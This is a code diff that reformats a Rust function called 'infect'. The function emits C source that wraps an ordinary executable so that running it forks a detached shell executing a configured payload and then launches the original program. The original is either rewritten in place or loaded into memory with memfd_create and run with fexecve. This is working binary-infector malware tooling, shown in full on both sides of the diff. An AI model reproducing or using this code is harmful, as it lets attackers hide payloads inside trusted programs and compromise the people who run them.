@@ -97,51 +97,65 @@ pub async fn infect<W: AsyncWrite + Unpin>(
         let mut compiler = Compiler { stdin };
         let mut buf = String::new();
         c_escape(config.payload.as_bytes(), &mut buf)?;
-        compiler.add_lines(&[
-            "#define _GNU_SOURCE\n",
-            "#include <stdio.h>\n",
-            "#include <stdlib.h>\n",
-            "#include <unistd.h>\n",
-            "#include <fcntl.h>\n",
-            "#include <sys/mman.h>\n",
-            "#include <linux/limits.h>\n",
-            "int main(int argc, char** argv) {\n",
-            "pid_t c = fork();\n",
-            "if (c) goto bin;\n",
-            "setsid();\n",
-            &format!("char *args[]={{\"/bin/sh\", \"-c\", \"{}\", NULL}};\n", buf),
-            "execve(\"/bin/sh\", args, environ);\n",
-            "exit(0);\n",
-            "bin:\n",
-        ]).await?;
+        compiler
+            .add_lines(&[
+                "#define _GNU_SOURCE\n",
+                "#include <stdio.h>\n",
+                "#include <stdlib.h>\n",
+                "#include <unistd.h>\n",
+                "#include <fcntl.h>\n",
+                "#include <sys/mman.h>\n",
+                "#include <linux/limits.h>\n",
+                "int main(int argc, char** argv) {\n",
+                "pid_t c = fork();\n",
+                "if (c) goto bin;\n",
+                "setsid();\n",
+                &format!("char *args[]={{\"/bin/sh\", \"-c\", \"{}\", NULL}};\n", buf),
+                "execve(\"/bin/sh\", args, environ);\n",
+                "exit(0);\n",
+                "bin:\n",
+            ])
+            .await?;
 
         if config.self_replace {
             if let Some(assume_path) = &config.assume_path {
                 buf.clear();
                 c_escape(assume_path.as_bytes(), &mut buf)?;
-                compiler.add_line(&format!("char *p=\"{}\";\n", buf)).await?;
+                compiler
+                    .add_line(&format!("char *p=\"{}\";\n", buf))
+                    .await?;
             } else {
-                compiler.add_lines(&[
-                    "char p[PATH_MAX+1];\n",
-                    "ssize_t n = readlink(\"/proc/self/exe\", p, sizeof(p)-1);\n",
-                    "p[n]=0;\n",
-                ]).await?;
+                compiler
+                    .add_lines(&[
+                        "char p[PATH_MAX+1];\n",
+                        "ssize_t n = readlink(\"/proc/self/exe\", p, sizeof(p)-1);\n",
+                        "p[n]=0;\n",
+                    ])
+                    .await?;
             }
-            compiler.add_lines(&[
-                "unlink(p);\n",
-                "int f = open(p, O_CREAT | O_TRUNC | O_WRONLY, 0755);\n",
-            ]).await?;
+            compiler
+                .add_lines(&[
+                    "unlink(p);\n",
+                    "int f = open(p, O_CREAT | O_TRUNC | O_WRONLY, 0755);\n",
+                ])
+                .await?;
             c_stream_bin(orig, &mut compiler.stdin).await?;
-            compiler.add_lines(&[
-                "close(f);\n",
-                "execve(p, argv, environ);\n",
-                "exit(1);\n",
-                "}\n",
-            ]).await?;
+            compiler
+                .add_lines(&[
+                    "close(f);\n",
+                    "execve(p, argv, environ);\n",
+                    "exit(1);\n",
+                    "}\n",
+                ])
+                .await?;
         } else {
-            compiler.add_line("int f = memfd_create(\"\", MFD_CLOEXEC);\n").await?;
+            compiler
+                .add_line("int f = memfd_create(\"\", MFD_CLOEXEC);\n")
+                .await?;
             c_stream_bin(orig, &mut compiler.stdin).await?;
-            compiler.add_lines(&["fexecve(f, argv, environ);\n", "exit(1);\n", "}\n"]).await?;
+            compiler
+                .add_lines(&["fexecve(f, argv, environ);\n", "exit(1);\n", "}\n"])
+                .await?;
         }
     }
 
